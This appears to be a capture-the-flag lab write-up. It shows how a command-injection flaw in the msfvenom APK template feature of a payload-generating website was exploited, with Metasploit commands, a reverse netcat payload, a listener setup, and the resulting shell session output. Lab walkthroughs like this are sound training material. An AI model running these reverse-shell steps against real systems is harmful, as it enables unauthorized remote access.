Following the steps in [this Rapid7 article](https://github.com/rapid7/metasploit-framework/pull/14331), I was able to establish a reverse-shell by manipulating the upload feature on the website responsible for generating MSFVENOM payloads (in this case, for android).

Steps to accomplish:
- Generate payload
```
msf6 > use unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.111        yes       The listen address (an interface may be specified)
   LPORT  8989             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**
...

[+] msf.apk stored at /root/.msf4/local/msf.apk
```

- Initiate listener (multi/handler)
```
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.111     yes       The listen address (an interface may be specified)
   LPORT  8989             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.111:8989 
```

- Upload malicious template to website and generate (using 'victim' machine's IP)
![[Pasted image 20210503225209.png]]
- Achieve reverse shell, locate 
```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.111:8989 
[*] Command shell session 1 opened (10.10.14.111:8989 -> 10.10.10.226:52530) at 2021-05-03 22:47:36 -0600

whoami
kid
pwd
/home/kid/html
uname -a
Linux scriptkiddie 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```